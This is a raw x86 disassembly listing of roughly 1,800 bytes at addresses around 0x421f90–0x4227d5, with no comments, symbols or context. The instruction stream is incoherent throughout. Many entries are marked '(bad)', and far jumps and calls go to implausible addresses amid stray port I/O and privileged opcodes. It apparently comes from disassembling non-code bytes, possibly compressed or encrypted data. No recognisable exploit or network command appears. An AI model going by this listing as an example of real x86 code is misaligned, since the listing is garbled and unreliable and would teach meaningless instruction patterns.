  421f90:	xlat   BYTE PTR ds:[ebx]
  421f91:	fiadd  WORD PTR [edx]
  421f93:	aam    0xf0
  421f95:	push   cs
  421f96:	(bad)  
  421f97:	or     edi,esp
  421f99:	jmp    ecx
  421f9b:	mov    cl,0xc8
  421f9d:	div    dh
  421f9f:	leave  
  421fa0:	loop   0x421f55
  421fa2:	jmp    0xd1fb:0xf3fab4b0
  421fa9:	call   0xc42ef781
  421fae:	fcmovu st,st(6)
  421fb0:	push   es
  421fb1:	mov    ebp,0x4cbe301
  421fb6:	or     esi,ebp
  421fb8:	in     al,0x0
  421fba:	pop    es
  421fbb:	iret   
  421fbc:	lods   al,BYTE PTR ds:[esi]
  421fbd:	mov    al,0xc7
  421fbf:	retf   0xb1ac
  421fc2:	in     al,dx
  421fc3:	shr    al,cl
  421fc5:	hlt    
  421fc6:	cli    
  421fc7:	in     eax,dx
  421fc8:	into   
  421fc9:	rol    DWORD PTR [ecx],1
  421fcb:	add    bh,ah
  421fcd:	fcomip st,st(7)
  421fcf:	aam    0xf0
  421fd1:	cmc    
  421fd2:	hlt    
  421fd3:	jmp    0x421f97
  421fd5:	out    dx,al
  421fd6:	enter  0xf4fb,0xde
  421fda:	jmp    0xa50adfce
  421fdf:	in     eax,0xcf
  421fe1:	int3   
  421fe2:	iret   
  421fe3:	mov    dl,0xef
  421fe5:	in     eax,dx
  421fe6:	leave  
  421fe7:	jmp    0x421fe0
  421fe9:	std    
  421fea:	fnstcw WORD PTR [ecx-0x132b3020]
  421ff0:	stc    
  421ff1:	repz add ch,dl
  421ff4:	cld    
  421ff5:	mul    ch
  421ff7:	fcmove st,st(4)
  421ff9:	(bad)  
  421ffb:	loop   0x421fe5
  421ffd:	xlat   BYTE PTR ds:[ebx]
  421ffe:	(bad)  
  421fff:	scas   eax,DWORD PTR es:[edi]
  422000:	out    0xc2,eax
  422002:	jmp    0xe00209db
  422007:	cld    
  422008:	xlat   BYTE PTR ds:[ebx]
  422009:	mov    cl,0xfb
  42200b:	(bad)  
  42200d:	not    dl
  42200f:	add    al,0x7
  422011:	jecxz  0x421ffe
  422013:	push   es
  422014:	add    al,0x9
  422016:	fdivr  st,st(1)
  422018:	loop   0x421fe4
  42201a:	add    edi,ecx
  42201c:	call   0xd436f7c9
  422021:	shr    DWORD PTR [eax-0xd134b08],1
  422027:	retf   0xc8d8
  42202a:	mov    eax,0xfcf8d3e2
  42202f:	stc    
  422030:	add    esp,esp
  422032:	push   es
  422033:	(bad)  
  422034:	jmp    0x2411916
  422039:	int    0xf1
  42203b:	shr    DWORD PTR [edi-0x371a2e11],1
  422041:	test   eax,0xdbbbbbb3
  422046:	icebp  
  422047:	ror    cl,1
  422049:	(bad)  
  42204b:	add    DWORD PTR [edx-0x270007ff],edi
  422051:	add    bl,cl
  422053:	mov    edi,0xc708dac0
  422058:	(bad)  
  42205a:	or     ecx,esp
  42205c:	(bad)  
  42205d:	leave  
  42205e:	mov    dl,0xcf
  422060:	aad    0xec
  422062:	shr    eax,0xca
  422065:	lods   eax,DWORD PTR ds:[esi]
  422066:	lock mov dh,0xcf
  422069:	mov    esi,0xe3fdfebb
  42206e:	out    0xf4,al
  422070:	(bad)  
  422071:	loop   0x422059
  422073:	jmp    0x91b2c48
  422078:	out    dx,al
  422079:	or     ecx,DWORD PTR [ecx]
  42207b:	mov    ecx,0xf5beeecd
  422080:	cmc    
  422081:	ror    ch,0xf5
  422084:	xlat   BYTE PTR ds:[ebx]
  422085:	in     eax,0xfb
  422087:	mov    eax,0xdcc2c8f0
  42208c:	add    ebp,edi
  42208e:	aam    0xed
  422090:	fidivr DWORD PTR [ebp+edi*8-0x202b193f]
  422097:	hlt    
  422098:	fcmovnu st,st(3)
  42209a:	ror    dl,0xf7
  42209d:	in     eax,dx
  42209e:	cmc    
  42209f:	mov    esp,0xb7d3fbcc
  4220a4:	xbegin 0xbf3cf278
  4220aa:	in     eax,dx
  4220ab:	leave  
  4220ac:	cli    
  4220ad:	in     al,dx
  4220ae:	sti    
  4220af:	(bad)  
  4220b0:	repnz in al,0xbc
  4220b3:	add    dh,ah
  4220b5:	add    al,0xa
  4220b7:	in     al,dx
  4220b8:	retf   
  4220b9:	iret   
  4220ba:	out    dx,al
  4220bb:	ror    ah,0xb1
  4220be:	fsubp  st(4),st
  4220c0:	(bad)  
  4220c1:	jmp    0xff1bd678
  4220c6:	retf   
  4220c7:	iret   
  4220c8:	jecxz  0x42209a
  4220ca:	mov    edi,0xbfefdae2
  4220cf:	in     al,0xf1
  4220d1:	clc    
  4220d2:	les    eax,FWORD PTR [eax]
  4220d4:	add    al,0xc7
  4220d6:	jmp    0xd1f0:0xd805e7fd
  4220dd:	leave  
  4220de:	shl    DWORD PTR [esi-0x26102d33],cl
  4220e4:	clc    
  4220e5:	(bad)  
  4220e6:	mov    dh,0xee
  4220e8:	(bad)
  4220ec:	mov    esp,0xf0f2b8fb
  4220f1:	aam    0xd5
  4220f3:	std    
  4220f4:	jmp    0xd90d:0xcfe5e0e6
  4220fb:	rcr    ah,cl
  4220fd:	mov    esi,0xc0d2b0af
  422102:	jmp    0x4220eb
  422104:	mov    esi,0xf4cbb7f9
  42210a:	retf   0xdbdb
  42210d:	(bad)  
  42210e:	(bad)  
  422110:	icebp  
  422111:	loope  0x422108
  422113:	rol    esp,0xd5
  422116:	cmc    
  422117:	jecxz  0x422105
  422119:	in     eax,dx
  42211a:	jmp    0x4220da
  42211c:	(bad)
  42211f:	xlat   BYTE PTR ds:[ebx]
  422120:	mov    ah,0xb7
  422122:	stc    
  422123:	in     eax,0xdb
  422125:	out    dx,eax
  422126:	mov    esi,0xf0fde8b8
  42212b:	xlat   BYTE PTR ds:[ebx]
  42212c:	add    eax,DWORD PTR [edi]
  42212e:	mov    esi,0xc0dcf7db
  422133:	aam    0xe5
  422135:	or     esi,esi
  422137:	retf   0xce02
  42213a:	push   es
  42213b:	fucomip st,st(5)
  42213d:	(bad)  
  42213e:	in     al,dx
  42213f:	stos   DWORD PTR es:[edi],eax
  422140:	mov    bh,0xcd
  422142:	mov    dl,0xba
  422144:	(bad)  
  422145:	out    0xdf,al
  422147:	mul    ah
  422149:	xlat   BYTE PTR ds:[ebx]
  42214a:	(bad)  
  42214c:	shl    BYTE PTR [ebp-0x2dfa2afa],1
  422152:	fisttp QWORD PTR [ecx]
  422154:	sar    ch,1
  422156:	add    ecx,ecx
  422158:	or     DWORD PTR [edx+eiz*8],ecx
  42215b:	mov    ecx,0xcee1f3f3
  422160:	repnz test eax,0xeef5e5b6
  422166:	(bad)  
  422168:	(bad)  
  42216a:	aam    0xce
  42216c:	(bad)  
  42216d:	cld    
  42216e:	mov    edi,0xb8f3bddf
  422173:	shr    edi,0x7
  422176:	fsubrp st(5),st
  422178:	(bad)  
  42217a:	paddsw mm5,mm3
  42217d:	mov    cl,0xdd
  42217f:	retf   
  422180:	repnz retf 
  422182:	stc    
  422183:	into   
  422184:	xlat   BYTE PTR ds:[ebx]
  422185:	in     al,0xf6
  422187:	fstp   TBYTE PTR [esi+esi*8-0x18121c0a]
  42218e:	(bad)  
  422190:	fadd   DWORD PTR [ecx]
  422192:	inc    BYTE PTR [eax]
  422194:	aad    0xf5
  422196:	fiadd  WORD PTR [edx]
  422198:	loopne 0x422182
  42219a:	add    al,cl
  42219c:	mov    eax,0xdcbdd0de
  4221a1:	retf   
  4221a2:	in     eax,0xf6
  4221a4:	call   0xff33f997
  4221a9:	mov    ebp,0xdbf4beef
  4221ae:	shl    dh,1
  4221b0:	repnz jmp 0xef8:0xfef9bfd5
  4221b8:	(bad)  
  4221ba:	std    
  4221bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221bc:	mov    edi,0xb5d3e1ae
  4221c1:	int3   
  4221c2:	(bad)  
  4221c4:	not    edx
  4221c6:	in     eax,dx
  4221c7:	in     eax,0xc4
  4221c9:	mov    ah,0xd7
  4221cb:	mov    ebp,0xffbdccda
  4221d0:	in     al,0xda
  4221d2:	fcom   st(5)
  4221d4:	sar    ch,1
  4221d6:	or     cl,dh
  4221d8:	fdiv   st(7),st
  4221da:	out    dx,al
  4221db:	retf   0xbff3
  4221de:	mov    esp,0xe5c3adc3
  4221e3:	leave  
  4221e4:	clc    
  4221e5:	jmp    0x4221a5
  4221e7:	lock mov esi,0xeecdceb8
  4221ed:	int    0xde
  4221ef:	cld    
  4221f0:	fadd   st(0),st
  4221f2:	idiv   edi
  4221f4:	or     esp,ebp
  4221f6:	inc    esp
  4221f8:	stc    
  4221f9:	into   
  4221fa:	(bad)  
  4221fb:	fucomip st,st(6)
  4221fd:	fild   QWORD PTR [eax-0x1d2a0b1b]
  422203:	mov    dl,0xd2
  422205:	cmc    
  422206:	xlat   BYTE PTR ds:[ebx]
  422207:	stc    
  422208:	mov    dl,0xd0
  42220a:	iret   
  42220b:	cmc    
  42220c:	cld    
  42220d:	rcl    ecx,1
  42220f:	rcr    edx,cl
  422211:	add    BYTE PTR [ecx],cl
  422213:	loopne 0x4221e5
  422215:	jmp    0xf1ce:0x8d80d06
  42221c:	ror    dh,0xe0
  42221f:	shl    dl,1
  422221:	in     al,dx
  422222:	shr    edx,1
  422224:	scas   al,BYTE PTR es:[edi]
  422225:	mov    cl,0xc9
  422227:	out    dx,al
  422228:	(bad)  
  42222a:	std    
  42222b:	lock ret 
  42222d:	mov    ebp,0xd1ffe4f6
  422232:	icebp  
  422233:	(bad)  
  422234:	faddp  st(5),st
  422236:	fcmovne st,st(5)
  422238:	cli    
  422239:	retf   
  42223a:	repz in eax,0xac
  42223d:	int3   
  42223e:	jmp    0xd8f9:0xebd1e7f0
  422245:	(bad)  
  422246:	xlat   BYTE PTR ds:[ebx]
  422247:	mov    ecx,0xdbffd8f7
  42224c:	sar    BYTE PTR [ebp-0x34221a42],0xea
  422253:	rcl    eax,0xcb
  422256:	push   cs
  422257:	(bad)  
  422259:	or     ebx,ebp
  42225b:	scas   al,BYTE PTR es:[edi]
  42225c:	fadd   st(1),st
  42225e:	fst    st(1)
  422260:	repnz mov bl,0xe4
  422263:	int3   
  422264:	icebp  
  422265:	in     eax,dx
  422266:	mov    bh,0xd4
  422268:	sar    BYTE PTR [edi-0x1d462110],cl
  42226e:	rcl    dl,cl
  422270:	xlat   BYTE PTR ds:[ebx]
  422271:	rcl    edi,1
  422273:	(bad)  
  422274:	clc    
  422275:	iret   
  422276:	(bad)  
  422277:	or     dh,bl
  422279:	std    
  42227a:	call   0xa51ee64a
  42227f:	in     eax,dx
  422280:	mov    edx,0xf2b9f6ba
  422286:	(bad)  
  422287:	stc    
  422288:	add    ecx,ecx
  42228a:	hlt    
  42228b:	aam    0xc1
  42228d:	mov    ebp,0xe4f4fabd
  422292:	mov    eax,0xc702daf1
  422297:	out    dx,al
  422298:	jmp    0xd0be:0xc0c9f3d8
  42229f:	xlat   BYTE PTR ds:[ebx]
  4222a0:	stos   BYTE PTR es:[edi],al
  4222a1:	(bad)  
  4222a2:	mov    edx,0xc8f2e7e9
  4222a7:	std    
  4222a8:	push   ecx
  4222aa:	out    dx,eax
  4222ab:	in     eax,dx
  4222ac:	mov    esp,0xfed1f501
  4222b1:	cli    
  4222b2:	add    eax,edx
  4222b4:	cli    
  4222b5:	neg    ebx
  4222b7:	add    dl,bl
  4222b9:	out    dx,al
  4222ba:	icebp  
  4222bb:	int3   
  4222bc:	loop   0x42226c
  4222be:	aad    0xb0
  4222c0:	aam    0xf1
  4222c2:	shr    ebx,0xc8
  4222c5:	mov    cl,0xf9
  4222c7:	fild   DWORD PTR [ebx]
  4222c9:	int3   
  4222ca:	sti    
  4222cb:	(bad)  
  4222cc:	ret    
  4222cd:	mov    esi,0xdebebbc6
  4222d2:	shl    esp,1
  4222d4:	or     bl,al
  4222d6:	loope  0x4222d4
  4222d8:	out    0xce,eax
  4222da:	in     eax,dx
  4222db:	loop   0x42228b
  4222dd:	ror    esi,1
  4222df:	lock into 
  4222e1:	mov    bh,0xa8
  4222e3:	sti    
  4222e4:	(bad)  
  4222e5:	mov    al,0xfa
  4222e7:	dec    edi
  4222e9:	cmc    
  4222ea:	mov    esi,0x6edbeee
  4222ef:	add    DWORD PTR [edi],eax
  4222f1:	sar    bh,cl
  4222f3:	lock or eax,ebp
  4222f6:	fstp   st(4)
  4222f8:	ret    0x300
  4222fb:	ret    0xe3f0
  4222fe:	(bad)  
  4222ff:	xlat   BYTE PTR ds:[ebx]
  422300:	repz imul DWORD PTR [ebp+eiz*8-0x2c000801]
  422308:	fdivr  QWORD PTR [eax-0x43fd0816]
  42230e:	in     al,dx
  42230f:	(bad)  
  422311:	xlat   BYTE PTR ds:[ebx]
  422312:	std    
  422313:	mov    edi,0xeabcdfde
  422318:	fild   DWORD PTR ds:0xf2b2abe7
  42231e:	jmp    0xcbbb:0xc4e1b6d7
  422325:	mov    al,0xec
  422327:	mov    ebp,0xcfdddbbd
  42232c:	fdivr  DWORD PTR [ebp-0x29053341]
  422332:	add    cl,ch
  422334:	(bad)  
  422335:	or     al,BYTE PTR [edi]
  422337:	out    dx,eax
  422338:	aam    0xdb
  42233a:	out    0xbd,eax
  42233c:	fisubr WORD PTR [eax-0x2d4a3442]
  422342:	shl    ch,1
  422344:	(bad)  
  422345:	retf   0xccb9
  422348:	iret   
  422349:	aam    0xf7
  42234b:	rcr    al,1
  42234d:	test   esi,0x2bdc3d9
  422353:	push   es
  422354:	fsubr  st,st(1)
  422356:	cmc    
  422357:	(bad)  
  422359:	push   es
  42235a:	(bad)  
  42235b:	in     al,dx
  42235c:	into   
  42235d:	call   0xf00acf54
  422362:	retf   
  422363:	repz int 0xfe
  422366:	repnz jmp 0x7d6:0xccd1b8d5
  42236e:	mul    ebx
  422370:	repz retf 
  422372:	sar    dl,cl
  422374:	xlat   BYTE PTR ds:[ebx]
  422375:	out    dx,al
  422376:	enter  0x202,0xd3
  42237a:	into   
  42237b:	icebp  
  42237c:	mov    cl,0xe7
  42237e:	ret    0xcfb0
  422381:	jmp    0xdf41fc4a
  422386:	lods   al,BYTE PTR ds:[esi]
  422387:	in     al,dx
  422388:	mov    dh,0xd5
  42238a:	int3   
  42238b:	std    
  42238c:	hlt    
  42238d:	loop   0x42236b
  42238f:	rcl    ebx,1
  422391:	ror    DWORD PTR [ecx],cl
  422393:	clc    
  422394:	lock push es
  422396:	std    
  422397:	sti    
  422398:	in     al,dx
  422399:	add    al,BYTE PTR [edi+ebp*4]
  42239c:	lds    edi,FWORD PTR [ecx+esi*4-0x490f1043]
  4223a3:	mov    al,0xf0
  4223a5:	repnz (bad) 
  4223a7:	iret   
  4223a8:	mov    edi,0xf2edcafc
  4223ad:	fnstsw WORD PTR [edi-0x43fa1806]
  4223b3:	not    eax
  4223b5:	iret   
  4223b6:	jmp    0x4223b2
  4223b8:	jmp    0x4223ad
  4223ba:	in     eax,0xc9
  4223bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223bd:	retf   
  4223be:	mov    esi,0xd5ace0d1
  4223c3:	(bad)
  4223c6:	mov    edi,0xd6d1eec5
  4223cb:	repz cld 
  4223cd:	imul   ch
  4223cf:	clc    
  4223d0:	sti    
  4223d1:	jmp    0x422397
  4223d3:	rol    DWORD PTR [esi],0xfd
  4223d6:	push   cs
  4223d7:	or     al,0xf9
  4223d9:	int3   
  4223da:	or     edi,eax
  4223dc:	fdiv   DWORD PTR [edx-0x4d1c1016]
  4223e2:	imul   eax
  4223e4:	les    esi,FWORD PTR [esi-0x4a171206]
  4223ea:	ret    0xd9bd
  4223ed:	xlat   BYTE PTR ds:[ebx]
  4223ee:	loopne 0x4223b6
  4223f0:	mov    esi,0x6e7e6da
  4223f5:	rcr    esi,0x7
  4223f8:	fild   DWORD PTR [ebx]
  4223fa:	in     al,dx
  4223fb:	shr    DWORD PTR [esi-0x31101d57],0xec
  422402:	in     al,0xc5
  422404:	(bad)  
  422405:	xlat   BYTE PTR ds:[ebx]
  422406:	cmc    
  422407:	mov    ah,0xf3
  422409:	add    bh,BYTE PTR [ebx+0x5b8cd02]
  42240f:	icebp  
  422410:	jmp    0x4223e6
  422412:	clc    
  422413:	or     eax,DWORD PTR [edi]
  422415:	inc    esp
  422417:	add    eax,0xa8dfc4df
  42241c:	(bad)  
  42241e:	loop   0x422403
  422420:	scas   al,BYTE PTR es:[edi]
  422421:	retf   
  422422:	loop   0x4223d6
  422424:	mov    ch,0xf3
  422426:	icebp  
  422427:	mov    ah,0xb2
  422429:	ret    
  42242a:	sti    
  42242b:	into   
  42242c:	rol    al,0xd9
  42242f:	lds    eax,FWORD PTR [esi]
  422431:	(bad)  
  422432:	in     eax,0xcb
  422434:	shl    ecx,0xfb
  422437:	out    0xef,eax
  422439:	leave  
  42243a:	int    0xe8
  42243c:	mov    esi,0xcce7afe2
  422441:	mov    bh,0xea
  422443:	idiv   DWORD PTR [eax-0x91107]
  422449:	repnz mov edx,0xc3dad3e9
  42244f:	aam    0xfd
  422451:	in     al,0xcb
  422453:	add    ecx,DWORD PTR [edi]
  422455:	add    al,0xfb
  422457:	loop   0x422444
  422459:	add    al,0xe9
  42245b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42245c:	not    edi
  42245e:	mov    dh,0xf7
  422460:	aad    0xef
  422462:	mov    edx,0xe8def8b0
  422467:	fadd   st(4),st
  422469:	iret   
  42246a:	(bad)  
  42246c:	mov    esi,0xf7fad6ec
  422471:	add    ebx,edi
  422473:	cld    
  422474:	idiv   bh
  422476:	(bad)  
  422477:	add    BYTE PTR [esi+ebp*8],al
  42247a:	int    0xe3
  42247c:	(bad)  
  42247e:	lods   al,BYTE PTR ds:[esi]
  42247f:	cmc    
  422480:	aad    0xf0
  422482:	jmp    0xc9c8:0xaccdcdd8
  422489:	(bad)  
  42248a:	fldlg2 
  42248c:	int    0x7
  42248e:	out    0xd5,al
  422490:	rol    ch,0xff
  422493:	loopne 0x422465
  422495:	or     DWORD PTR [esp+eax*8],eax
  422498:	cli    
  422499:	out    dx,al
  42249a:	(bad)  
  42249b:	in     eax,dx
  42249c:	ffreep st(0)
  42249e:	jecxz  0x422482
  4224a0:	mov    dl,0xe2
  4224a2:	shr    BYTE PTR [edi-0x49443925],1
  4224a8:	retf   0xefc9
  4224ab:	mov    ecx,0xe0b8d7d5
  4224b0:	fyl2xp1 
  4224b2:	retf   
  4224b3:	in     al,0xf9
  4224b5:	fld    QWORD PTR [edx]
  4224b7:	ret    
  4224b8:	push   es
  4224b9:	loope  0x4224bc
  4224bb:	enter  0xe6ed,0xe2
  4224bf:	icebp  
  4224c0:	in     eax,0xed
  4224c2:	out    0xf3,al
  4224c4:	push   edx
  4224c6:	lock in al,dx
  4224c8:	repnz mov ebp,0xbeddfdfc
  4224ce:	neg    edi
  4224d0:	div    dh
  4224d2:	(bad)  
  4224d4:	out    0xdd,eax
  4224d6:	fsub   st,st(7)
  4224d8:	out    dx,al
  4224d9:	leave  
  4224da:	leave  
  4224db:	jmp    0x4224c9
  4224dd:	jecxz  0x42248f
  4224df:	sar    BYTE PTR [ebp+edx*8-0x1a0e1217],0xd0
  4224e7:	sti    
  4224e8:	call   0x212e8ca
  4224ed:	in     al,dx
  4224ee:	pop    es
  4224ef:	sar    ebp,cl
  4224f1:	aad    0xc4
  4224f3:	pop    es
  4224f4:	in     eax,0x3
  4224f6:	add    al,BYTE PTR [esi]
  4224f8:	push   cs
  4224f9:	add    esp,edx
  4224fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224fc:	mov    edi,0xe9d2e5c7
  422501:	sti    
  422502:	rcr    cl,1
  422504:	mov    dl,0xef
  422506:	sar    bl,cl
  422508:	fdivr  st,st(5)
  42250a:	repnz hlt 
  42250c:	pop    es
  42250d:	cli    
  42250e:	int3   
  42250f:	(bad)  
  422510:	mov    edx,0xfcc1e3f5
  422515:	test   DWORD PTR [edi],0x4c106d4
  42251b:	jmp    0xac0702e2
  422520:	retf   0xe6c2
  422523:	retf   
  422524:	ror    ah,1
  422526:	stc    
  422527:	in     eax,dx
  422528:	(bad)  
  422529:	mov    edx,0xfbbfcce3
  42252e:	sar    esi,1
  422530:	push   es
  422531:	loopne 0x4224f4
  422533:	ret    
  422534:	out    0x9,al
  422536:	mov    esp,0x70e04fa
  42253b:	lods   al,BYTE PTR ds:[esi]
  42253c:	jecxz  0x4224e3
  42253e:	fidiv  WORD PTR [ebp-0x394d493e]
  422544:	shr    dh,1
  422546:	rcr    ch,1
  422548:	sar    BYTE PTR [eax+ebx*8-0x181f0443],1
  42254f:	in     al,dx
  422550:	fcmovnu st,st(3)
  422552:	jmp    0xe744f13b
  422557:	jmp    0xccaf:0xd906df04
  42255e:	out    dx,eax
  42255f:	into   
  422560:	(bad)  
  422562:	out    0xce,al
  422564:	out    dx,al
  422565:	aad    0xf1
  422567:	repz mov edi,0xecd8ffef
  42256d:	sti    
  42256e:	loope  0x422555
  422570:	add    bh,ah
  422572:	aad    0xc9
  422574:	test   DWORD PTR ds:0xc1c60506,0xeebdbcdd
  42257e:	scas   eax,DWORD PTR es:[edi]
  42257f:	test   bl,0xd4
  422582:	mov    bh,0xc7
  422584:	mov    ch,0xc8
  422586:	into   
  422587:	jmp    0xd507:0xb9bfcabe
  42258e:	mov    ah,0x6
  422590:	in     al,0x6
  422592:	clc    
  422593:	hlt    
  422594:	fadd   QWORD PTR [edx]
  422596:	loope  0x4225a7
  422598:	ret    0xf8c1
  42259b:	ffree  st(7)
  42259d:	out    0xd3,eax
  42259f:	shl    ebx,1
  4225a1:	shl    BYTE PTR [esi-0x4434334f],cl
  4225a7:	fcom   st(3)
  4225a9:	mov    ebx,0xeebac901
  4225ae:	(bad)  
  4225b0:	shl    bh,1
  4225b2:	shl    ah,0xc7
  4225b5:	or     edx,edi
  4225b7:	push   es
  4225b8:	jecxz  0x4225a6
  4225ba:	repnz retf 0xcab1
  4225be:	(bad)  
  4225bf:	in     eax,0xce
  4225c1:	int    0xc4
  4225c3:	lock repnz int 0xec
  4225c7:	cld    
  4225c8:	hlt    
  4225c9:	mov    cl,0xea
  4225cb:	out    dx,eax
  4225cc:	(bad)  
  4225ce:	out    0xe5,eax
  4225d0:	(bad)  
  4225d2:	or     eax,esi
  4225d4:	in     eax,0x7
  4225d6:	out    0xe5,al
  4225d8:	loop   0x4225d6
  4225da:	cli    
  4225db:	loope  0x4225b5
  4225dd:	(bad)  
  4225de:	aad    0xf4
  4225e0:	mov    dl,0xfb
  4225e2:	into   
  4225e3:	loope  0x42259f
  4225e5:	fucomip st,st(2)
  4225e7:	imul   edx
  4225e9:	fnsave [ebp+esi*8-0x23030123]
  4225f0:	in     eax,0xe7
  4225f2:	out    0xe3,al
  4225f4:	fsubrp st(6),st
  4225f6:	in     eax,dx
  4225f7:	or     cl,BYTE PTR [edi]
  4225f9:	retf   
  4225fa:	in     eax,0xe4
  4225fc:	int    0xc3
  4225fe:	in     al,0xe6
  422600:	int3   
  422601:	cmc    
  422602:	loope  0x4225d9
  422604:	shr    ah,cl
  422606:	retf   
  422607:	(bad)  
  422608:	repnz stc 
  42260a:	fmul   st(1),st
  42260c:	out    dx,eax
  42260d:	icebp  
  42260e:	rcl    ch,0xf5
  422611:	(bad)  
  422612:	in     al,0xfc
  422614:	cld    
  422615:	mov    BYTE PTR ds:0xe8d9f3ca,0xee
  42261c:	repz jmp 0xdb361009
  422622:	mov    bh,0xd5
  422624:	mov    ah,0xdb
  422626:	mov    ebx,0xdff1ceca
  42262b:	xlat   BYTE PTR ds:[ebx]
  42262c:	(bad)  
  42262e:	shl    cl,cl
  422630:	(bad)  
  422631:	clc    
  422632:	push   es
  422633:	aad    0xc2
  422635:	(bad)  
  422636:	sti    
  422637:	retf   0xe20e
  42263a:	jmp    0x4225fa
  42263c:	out    0xac,al
  42263e:	repnz retf 
  422640:	(bad)  
  422643:	rcl    edx,cl
  422645:	(bad)  
  422646:	jmp    0xec01:0xd7c9effb
  42264d:	clc    
  42264e:	shl    al,cl
  422650:	push   es
  422651:	add    ch,dh
  422653:	or     ch,dh
  422655:	xlat   BYTE PTR ds:[ebx]
  422656:	(bad)  
  422658:	cli    
  422659:	fisttp DWORD PTR [ebx]
  42265b:	mov    ebp,0xf1d2d6b1
  422660:	mov    esp,0xcbb9d0f2
  422665:	(bad)  
  422666:	in     al,0xe4
  422668:	clc    
  422669:	mov    ah,0xcf
  42266b:	into   
  42266c:	(bad)  
  42266d:	out    dx,eax
  42266e:	fiadd  DWORD PTR [eax]
  422670:	(bad)  [ebx]
  422672:	ffree  st(4)
  422674:	pop    es
  422675:	mov    ebp,0xdbe30cc8
  42267a:	in     eax,0xc5
  42267c:	scas   al,BYTE PTR es:[edi]
  42267d:	not    al
  42267f:	in     eax,dx
  422680:	leave  
  422681:	iret   
  422682:	icebp  
  422683:	(bad)  
  422684:	stc    
  422685:	(bad)  
  422686:	iret   
  422687:	in     eax,0xc9
  422689:	mov    esi,0xfbef00cd
  42268e:	in     eax,0x0
  422690:	vpsubd ymm3,ymm5,ymm7
  422694:	(bad)  
  422696:	add    BYTE PTR [ecx*1-0x553a02ff],cl
  42269d:	fnsave [esi-0x333f3151]
  4226a3:	mov    bh,0xed
  4226a5:	lods   eax,DWORD PTR ds:[esi]
  4226a6:	retf   
  4226a7:	sti    
  4226a8:	mov    edx,0xedc2baf9
  4226ad:	sti    
  4226ae:	cld    
  4226af:	loope  0x422694
  4226b1:	in     eax,0xe7
  4226b3:	add    cl,BYTE PTR [edi]
  4226b5:	cld    
  4226b6:	ror    bh,0xcd
  4226b9:	jmp    0xd7f0:0xf0c9c800
  4226c0:	div    dl
  4226c2:	mov    dl,0xd0
  4226c4:	in     eax,0xb9
  4226c6:	mov    edi,0xbbdac8d7
  4226cb:	loopne 0x4226c7
  4226cd:	aam    0xcd
  4226cf:	mov    esp,0xcae2d0de
  4226d4:	push   es
  4226d5:	leave  
  4226d6:	iret   
  4226d7:	aam    0x5
  4226d9:	add    al,0x0
  4226db:	(bad)  
  4226dd:	shl    ebx,0xe5
  4226e0:	lods   al,BYTE PTR ds:[esi]
  4226e1:	int    0xe7
  4226e3:	mov    ecx,0xebf8d3b4
  4226e8:	test   dh,0xbf
  4226eb:	iret   
  4226ec:	icebp  
  4226ed:	ret    0xf5bd
  4226f0:	or     esi,edi
  4226f2:	shr    dl,1
  4226f4:	enter  0xe1c8,0xf5
  4226f8:	jecxz  0x4226c3
  4226fa:	(bad)  
  4226fb:	loopne 0x4226aa
  4226fd:	(bad)  
  4226fe:	mov    bh,0xc4
  422700:	into   
  422701:	rol    ecx,cl
  422703:	mov    ch,0xdf
  422705:	lock retf 
  422707:	xlat   BYTE PTR ds:[ebx]
  422708:	(bad)  
  422709:	in     al,dx
  42270a:	in     al,dx
  42270b:	fiadd  WORD PTR [edi]
  42270d:	in     eax,dx
  42270e:	int    0xdf
  422710:	(bad)  
  422713:	cld    
  422714:	(bad)  
  422715:	fsubrp st(3),st
  422717:	add    eax,ebp
  422719:	repnz add BYTE PTR [esi+eax*8-0x174d090a],bh
  422721:	call   0xe70702ed
  422726:	(bad)  
  422729:	stc    
  42272a:	retf   0xb9cd
  42272d:	add    dl,cl
  42272f:	add    cl,al
  422731:	or     bl,al
  422733:	mul    esi
  422735:	fucom  st(4)
  422737:	in     eax,dx
  422738:	(bad)  
  422739:	in     al,dx
  42273a:	int    0xee
  42273c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42273d:	int3   
  42273e:	xlat   BYTE PTR ds:[ebx]
  42273f:	(bad)  
  422740:	(bad)  
  422741:	cli    
  422742:	iret   
  422743:	icebp  
  422744:	cmc    
  422745:	cli    
  422746:	in     eax,dx
  422747:	out    dx,eax
  422748:	icebp  
  422749:	out    dx,eax
  42274a:	icebp  
  42274b:	leave  
  42274c:	rcr    esp,0xd9
  42274f:	stc    
  422750:	call   esi
  422752:	(bad)  
  422753:	loopne 0x42273f
  422755:	(bad)  
  422756:	fimul  WORD PTR [ebx+esi*8]
  422759:	adc    al,BYTE PTR [eax+edx*8]
  42275c:	rol    dh,1
  42275e:	call   0xd125f424
  422763:	loope  0x42274a
  422765:	jmp    0xf8161b3f
  42276a:	out    dx,eax
  42276b:	mov    bh,0xdb
  42276d:	clc    
  42276e:	in     eax,0xbf
  422770:	add    ch,bh
  422772:	sti    
  422773:	clc    
  422774:	add    bh,dl
  422776:	aad    0xfc
  422778:	push   cs
  422779:	fdivp  st(1),st
  42277b:	(bad)  
  42277c:	jecxz  0x422740
  42277e:	test   bl,0xb1
  422781:	in     al,0xca
  422783:	mov    bl,0xc0
  422785:	in     eax,0xfd
  422787:	(bad)
  42278a:	mov    ebx,0xd901c2f4
  42278f:	(bad)  
  422790:	fstp   st(3)
  422792:	(bad)  
  422794:	fld    QWORD PTR [ebx+eax*1]
  422797:	retf   0xe3ed
  42279a:	repz out dx,al
  42279c:	shr    bl,cl
  42279e:	loop   0x422762
  4227a0:	in     eax,0xb1
  4227a2:	hlt    
  4227a3:	call   0xc614f58d
  4227a8:	aad    0xec
  4227aa:	ret    
  4227ab:	in     eax,dx
  4227ac:	shl    ah,1
  4227ae:	add    edi,esi
  4227b0:	repnz add al,0xca
  4227b3:	ret    0xd7ef
  4227b6:	retf   0xe7e8
  4227b9:	std    
  4227ba:	iret   
  4227bb:	jmp    0xb2330f84
  4227c0:	rep lods al,BYTE PTR ds:[esi]
  4227c2:	cmc    
  4227c3:	loope  0x422773
  4227c5:	(bad)  
  4227c6:	(bad)  
  4227c8:	fcomp  st(5)
  4227ca:	lock into 
  4227cc:	ror    ebp,cl
  4227ce:	cli    
  4227cf:	loop   0x4227d4
  4227d1:	fcmovbe st,st(2)
  4227d3:	out    0xca,eax
  4227d5:	fdivr  st,st(6)
